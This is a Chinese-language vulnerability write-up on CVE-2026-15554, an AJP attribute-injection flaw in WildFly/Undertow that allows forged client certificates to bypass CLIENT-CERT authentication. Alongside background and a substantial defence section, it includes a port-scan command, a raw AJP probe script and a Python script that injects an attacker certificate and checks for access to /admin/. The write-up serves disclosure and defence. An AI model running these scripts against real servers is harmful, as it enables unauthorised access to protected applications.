🔓 AJP协议属性注入：绕过CLIENT-CERT认证的新攻击面

🐱‍💻 漏洞概述

CVE-2026-15554 (CVSS 7.4) 是 Red Hat EAP 中 Undertow 组件的一个认证绕过漏洞。攻击者可以构造恶意的AJP请求，通过注入 ssl_cert 和 is_ssl 属性，伪造客户端TLS证书身份，从而完全绕过 CLIENT-CERT 认证机制。

⚡ 一句话总结：AJP端口默认监听所有接口→任何能TCP连接8009的攻击者可以伪造X.509证书→绕过整个CLIENT-CERT信任链

🔧 AJP协议背景

AJP (Apache JServ Protocol) 是 Apache httpd 与后端 Java 应用服务器 (Tomcat/WildFly/JBoss) 之间的二进制通信协议，工作在 TCP 8009 端口。

它的设计假设是：只有前端反向代理会发送AJP请求。但TCP协议本身没有身份验证——任何能到达8009端口的主机都可以直接构造AJP数据包。

正常架构：
Client → [TLS] → Apache httpd (mod_jk) → [AJP:8009] → Tomcat/WildFly
                         ↑
                    TLS终止后设置:
                    ssl_cert = 客户端证书
                    is_ssl = true

攻击场景：
Attacker → [TCP:8009] → WildFly
                ↑
          直接注入伪造的:
          ssl_cert = 攻击者证书
          is_ssl = true

⚡ 攻击原理

核心在于三个致命的设计缺陷叠加：

1️⃣ AJP端口暴露

AJP连接器默认监听 0.0.0.0:8009，而非仅 127.0.0.1。在K8s集群中，这意味着任何Pod都可以访问。

2️⃣ 协议属性可伪造

AJP协议的属性字段是明文的键值对，没有认证或签名。攻击者可以直接构造包含 ssl_cert 和 is_ssl 的AJP Forward Request数据包。

# 伪造AJP请求中的关键属性（伪代码）
ajp_request.set_attribute("ssl_cert", ATTACKER_CERT_PEM)
ajp_request.set_attribute("is_ssl", "true")
# 后端会将其映射为:
# javax.servlet.request.X509Certificate = [attackerCert]

3️⃣ 后端信任协议属性

WildFly/Undertow的AJP监听器将这些属性直接映射为Servlet API中的 X509Certificate——应用代码无法区分这是真实的TLS证书还是AJP注入的伪造证书。

关键洞察：这与之前的 Ghostcat (CVE-2020-1938) 不同。Ghostcat利用AJP的文件读取功能，而CVE-2026-15554利用AJP的属性注入功能实现认证绕过，影响范围更广。

🎯 利用与检测

快速检测AJP端口暴露

# 扫描目标是否暴露AJP端口
nmap -p 8009 target.example.com

# 如果8009开放，发送CPING探测
python3 -c "
import socket
s = socket.socket()
s.settimeout(5)
s.connect(('target', 8009))
# AJP CPING 包 (type=0x0a)
s.send(b'\x12\x34\x00\x01\x0a')
resp = s.recv(16)
if resp:
    print('[!] AJP端口可达，可能存在属性注入风险')
    print(f'    响应: {resp.hex()}')
s.close()
"

属性注入检测

# 使用ajpy工具发送带伪造证书的请求
# pip install ajpy
python3 -c "
import ajpy

# 构造Forward Request + ssl_cert属性
req = ajpy.AjpForwardRequest(
    method='GET',
    server_name='target',
    server_port=8009,
    remote_addr='10.0.0.1',
    req_uri='/admin/',
)
# 注入伪造证书属性
req.attributes['ssl_cert'] = open('attacker.crt').read()
req.attributes['is_ssl'] = 'true'

# 发送并检查是否获得认证后的内容
resp = req.send('target', 8009)
if resp.status_code == 200 and 'admin' in resp.body.lower():
    print('[+] CLIENT-CERT认证绕过成功！')
"

🌊 影响范围与扩展

受影响组件

  • 🔴 WildFly / JBoss EAP — Undertow AJP连接器直接受影响
  • 🔴 Tomcat AJP — 类似攻击面（不同CVE但同源问题）
  • 🟡 Jetty AJP — 需验证是否接受属性注入

🔗 同类协议攻击面扩展

这不是AJP独有的问题。任何缺乏认证的二进制内部协议都存在类似的属性注入风险：

  • 📌 MySQL CLIENT_SSL标志 → 伪造SSL状态绕过加密要求
  • 📌 PostgreSQL SSLRequest → 中间人攻击
  • 📌 Redis RESP协议 → 认证绕过
  • 📌 gRPC metadata → TLS证书属性注入
  • 📌 HAProxy PROXY protocol → 源IP伪造

💡 核心洞察：「内部通道」的假设在容器化/微服务架构中已被打破。任何TCP可达的服务，其「信任」都需要显式认证来保证。

🧠 证书认证的信任根被打破

CLIENT-CERT认证的设计假设是：「证书由TLS层可信地传递」。但AJP把TLS层剥离后通过协议属性重新组装证书→假证书可以绕过整个TLS信任链。这是一个系统性的信任链断裂问题。

🛡 防御方案

紧急措施

# 1. Tomcat: AJP仅监听localhost + 启用secret认证
# server.xml
<Connector port="8009" address="127.0.0.1"
           protocol="AJP/1.3" secretRequired="true"
           secret="your-strong-random-secret"/>

# 2. WildFly CLI: 配置AJP secret
/subsystem=undertow/server=default-server/ajp-listener=ajp: \
    write-attribute(name=secret, value="strong-random-secret")

# 3. K8s NetworkPolicy: 限制AJP端口访问
apiVersion: networking.k8s.io/v1
kind: NetworkPolicy
metadata:
  name: restrict-ajp
spec:
  podSelector:
    matchLabels:
      role: java-app
  ingress:
  - from:
    - podSelector:
        matchLabels:
          role: reverse-proxy

长期方案

  • ✅ AJP secret认证（Tomcat 9.0.31+ / WildFly 23+ 强制）
  • ✅ 替换AJP为HTTP反向代理 + mTLS
  • ✅ 网络策略限制8009端口仅允许前端代理访问
  • ✅ 审计所有「内部协议」的认证状态：Redis/MySQL/PostgreSQL/gRPC
  • ✅ 扫描所有Java应用服务器的AJP暴露面
